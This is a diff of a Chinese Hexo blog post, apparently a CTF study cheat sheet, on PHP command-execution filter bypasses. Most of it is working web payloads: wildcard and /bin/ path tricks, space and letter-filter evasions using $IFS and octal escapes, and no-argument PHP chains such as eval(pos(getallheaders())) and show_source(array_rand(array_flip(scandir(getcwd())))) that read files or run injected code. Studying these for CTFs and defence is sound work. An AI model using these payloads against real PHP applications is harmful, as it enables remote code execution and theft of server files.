@@ -1,13 +1,23 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>命令执行 · Mini's blog</title><meta name="description" content="命令执行常用绕过方法过滤了指定字符串
-system(&amp;quot;cat fl*g.php&amp;quot;) : 使用通配符
-system(&amp;quot;tac f???????&amp;quot;) : 使用通配符
-system(&amp;quot;tac fl*g.php&amp;quot;) : 过滤 cat ,倒序输出文本"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>命令执行</a></h3></div><div class="post-content"><h2 id="命令执行常用绕过方法"><a href="#命令执行常用绕过方法" class="headerlink" title="命令执行常用绕过方法"></a>命令执行常用绕过方法</h2><h3 id="过滤了指定字符串"><a href="#过滤了指定字符串" class="headerlink" title="过滤了指定字符串"></a>过滤了指定字符串</h3><ul>
-<li><code>system(&quot;cat fl*g.php&quot;)</code> : 使用通配符</li>
-<li><code>system(&quot;tac f???????&quot;)</code> : 使用通配符</li>
-<li><code>system(&quot;tac fl*g.php&quot;)</code> : 过滤 <code>cat</code> ,倒序输出文本</li>
-<li><code>system(&quot;nl fl*g.php&quot;)</code> : 过滤 <code>cat</code> 、 <code>tac</code></li>
-<li><code>system(&quot;cp fl*g.php 1.txt | cat 1.txt&quot;)</code> : 访问 1.txt</li>
+cat fl*g.php&amp;quot; : 使用通配符
+tac f???????&amp;quot; : 使用通配符
+nl fl*g.php : 过滤 cat 、 tac 命令
+cp fl*g.php 1.txt | cat 1.txt : 间接访问 1.txt
+
+此外，"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>命令执行</a></h3></div><div class="post-content"><h2 id="命令执行常用绕过方法"><a href="#命令执行常用绕过方法" class="headerlink" title="命令执行常用绕过方法"></a>命令执行常用绕过方法</h2><h3 id="过滤了指定字符串"><a href="#过滤了指定字符串" class="headerlink" title="过滤了指定字符串"></a>过滤了指定字符串</h3><ul>
+<li><code>cat fl*g.php&quot;</code> : 使用通配符</li>
+<li><code>tac f???????&quot;</code> : 使用通配符</li>
+<li><code>nl fl*g.php</code> : 过滤 <code>cat</code> 、 <code>tac</code> 命令</li>
+<li><code>cp fl*g.php 1.txt | cat 1.txt</code> : 间接访问 1.txt</li>
 </ul>
+<p>此外，当 <code>cat</code> 等命令被过滤时，也可以使用如下方式来进行命令执行</p>
+<ul>
+<li><code>/bin/ca*</code></li>
+<li><code>/bin/ca?</code></li>
+</ul>
+<blockquote>
+<p>该类型的过滤，都可以尝试使用在 <code>/bin/</code> 目录下的可执行程序</p>
+</blockquote>
 <h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
 <li>使用TAB键 <code>%09</code> 代替</li>
 <li>使用 <code>&#123;$IFS&#125;</code> 代替</li>
@@ -20,10 +30,7 @@ system(&amp;quot;tac fl*g.php&amp;quot;) : 过滤 cat ,倒序输出文本"><meta
 <blockquote>
 <p><em>可以依次尝试，不一定全都可以绕过</em></p>
 </blockquote>
-<h3 id="过滤小数点"><a href="#过滤小数点" class="headerlink" title="过滤小数点"></a>过滤小数点</h3><ul>
-<li>使用 <code>pos(localeconv)</code> 来获取小数点: localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点</li>
-</ul>
-<h3 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h3><p>当题目过滤某个函数时候，可以尝试使用其他函数</p>
+<h3 id="常见系统命令执行函数"><a href="#常见系统命令执行函数" class="headerlink" title="常见系统命令执行函数"></a>常见系统命令执行函数</h3><p>当题目过滤某个函数时候，可以尝试使用其他函数</p>
 <ul>
 <li><code>system()</code></li>
 <li><code>passthur()</code></li>
@@ -54,4 +61,97 @@ system(&amp;quot;tac fl*g.php&amp;quot;) : 过滤 cat ,倒序输出文本"><meta
 <li><code>%0a</code> 是 url 回车符，因为空格被过滤，但在 eval() 函数中，会自动给字符串和变量间添加空格，因此可以不加</li>
 <li><code>?&gt;</code> php 定界符，用于绕过 <code>;</code> ，其原理是 php 遇到定界符会自动在末尾加上一个分号，简单来说就是 php 文件中最后一句在 <code>?&gt;</code> 前可以不加 <code>;</code></li>
 </ul>
+<h3 id="无字母命令执行"><a href="#无字母命令执行" class="headerlink" title="无字母命令执行"></a>无字母命令执行</h3><p>如果过滤了所有字母，想要执行命令，也可以使用 <code>$&#39;...&#39;</code> 语法定义包含转义序列的字符串<br>如 <code>ls</code> 变为 <code>$&#39;\154\163&#39;</code> ，<code>cat *</code> 变为 <code>$&#39;\143\141\164&#39;%20*</code></p>
+<h3 id="无参数读文件和命令执行"><a href="#无参数读文件和命令执行" class="headerlink" title="无参数读文件和命令执行"></a>无参数读文件和命令执行</h3><p>无参数指的是由于题目过滤限制，只能使用不带有参数的函数进行文件读取或命令执行</p>
+<h4 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h4><p><strong>查看当前目录文件名命令 - <code>print_r(scandir(&quot;.&quot;));</code> &amp; <code>var_dump(scandir(&#39;/&#39;));</code></strong></p>
+<p>此外打印函数还有：</p>
+<ul>
+<li><code>var_export()</code></li>
+<li>…</li>
+</ul>
+<p>列出文件名函数还有：</p>
+<ul>
+<li><code>glob(&#39;../../..&#39;.&#39;/*.php&#39;)</code> : 列出指定目录上的所有匹配文件名</li>
+</ul>
+<p>该命令需要构造参数里的 <code>&quot;.&quot;</code> ，有以下构造方法</p>
+<p>a). </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>localeconv()</code> : 该函数返回一个包含本地数字及货币格式信息的数组，数组第一项就是 <code>&quot;.&quot;</code><br></li>
+<li><code>current()</code> 函数返回数组中的单元，默认为第一个值</li>
+</ul>
+<p>除了 <code>current()</code> 函数，还有：</p>
+<ul>
+<li><code>pos()</code> 函数是 current 的别名</li>
+<li><code>reset()</code> 该函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
+</ul>
+<p>b).</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>()))))))))</span><br></pre></td></tr></table></figure>
+
+<p>该方法借助 <code>phpversion()</code> 返回PHP版本号，然后通过一系列函数计算得到 <code>&quot;.&quot;</code> </p>
+<p>c). </p>
+<ul>
+<li><code>getcwd()</code> : 获取当前工作目录的路径</li>
+</ul>
+<p>因此可以构造下面语句输出当前文件夹下所有文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h4><p>如果文件不能直接显示，比如PHP源码，则还需要函数进行读取，读文件函数可以使用如下：</p>
+<ul>
+<li><code>readfile()</code>  <em>（显示在源码处）</em></li>
+<li><code>file_get_contents()</code> <em>（显示在源码处）</em></li>
+<li><code>highlight_file()</code></li>
+<li><code>readgzfile()</code></li>
+<li><code>show_source()</code></li>
+</ul>
+<blockquote>
+<p>在禁用某些系统命令执行函数，如 <code>system(&quot;cat flag.php&quot;);</code> 时，也可以尝试直接使用读取文件函数，如 <code>c=highlight_file(&quot;flag.php&quot;);</code></p>
+</blockquote>
+<p>a). 如果要读取的文件位于 <code>scandir(getcwd())</code> 函数得到的数组中的最后一位，则可以使用下面方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br></pre></td></tr></table></figure>
+
+<p>b). 如果要读取的文件位于数组第一个，则可以使用 <code>array_reverse()</code> 以相反的元素顺序返回数组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
+<p>c). 如果要读取的文件位于数组倒数第二个，则可以使用 <code>next()</code>函数将数组内部指针向前移动一位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
+<p>d). 如果不是上述情况，则可以使用 <code>array_rand(array_flip())</code></p>
+<ul>
+<li><code>array_flip()</code> : 交换数组中的键和值</li>
+<li><code>array_rand()</code> : 从数组中随机返回一个</li>
+</ul>
+<p>所以可以构造下面语句，并多刷新几次尝试读取 flag.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+<h4 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h4><p>a). <code>dirname()</code> 方法</p>
+<p>该函数如果传入的值是一个绝对路径，则返回上一级目录，如果传入的是文件的绝对路径，则返回该文件的当前路径</p>
+<p>因此可以构造下面语句，查看上一级目录的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br></pre></td></tr></table></figure>
+
+<p>b). 构造 <code>&quot;..&quot;</code></p>
+<p><code>scandir(getcwd())</code> 返回的数组第二个就是 <code>&quot;..&quot;</code> ，所以可以使用 <code>next()</code> 函数获取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
+<p>此外，还有其它方法，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))))</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取上一级目录文件"><a href="#读取上一级目录文件" class="headerlink" title="读取上一级目录文件"></a>读取上一级目录文件</h4><p>直接使用 <code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd())))))); </code> 是不可以的，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录，使用 <code>chdir()</code> 来改变当前目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br></pre></td></tr></table></figure>
+<h4 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h4><p>传入的 code 不能含有参数，那就需要将参数放在别的地方，然后通过无参数函数来接收参数</p>
+<p>a). <code>getallheaders()</code> 和 <code>apache_request_hearders()</code> 函数，该函数只能在 Apache 环境下使用，它的作用是返回所有的 HTTP 请求头信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code = <span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(getallheaders));</span><br></pre></td></tr></table></figure>
+
+<p>上述代码返回请求头数组中的第一个值并执行，因此我们可以在请求头中第一位添加函数达到命令执行的效果</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MyHeader: phpinfo();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据自己构造请求头位置的不同，可以结合前文方法构造获取不同位置的数组</p>
+</blockquote>
+<p>b). <code>get_defined_vars()</code> 函数，该函数返回所有已定义变量的数组，这些变量包括环境变量、服务器变量、用户定义的变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=<span class="title function_ invoke__">phpinfo</span>();&amp;code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>())</span><br></pre></td></tr></table></figure>
+<p>上述语句会打印出所有变量的数组，包括自定义的变量 <code>flag=&gt;phpinfo();</code></p>
+<p>所以可以最终取到数组中自定义变量的值，最终造成命令执行，利用语句如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=<span class="title function_ invoke__">phpinfo</span>();&amp;code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]. <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940">无参数读文件和 RCE 总结 - CSDN</a></p>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-06</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/06/Command-Execution/,Mini's blog,命令执行,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">上一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
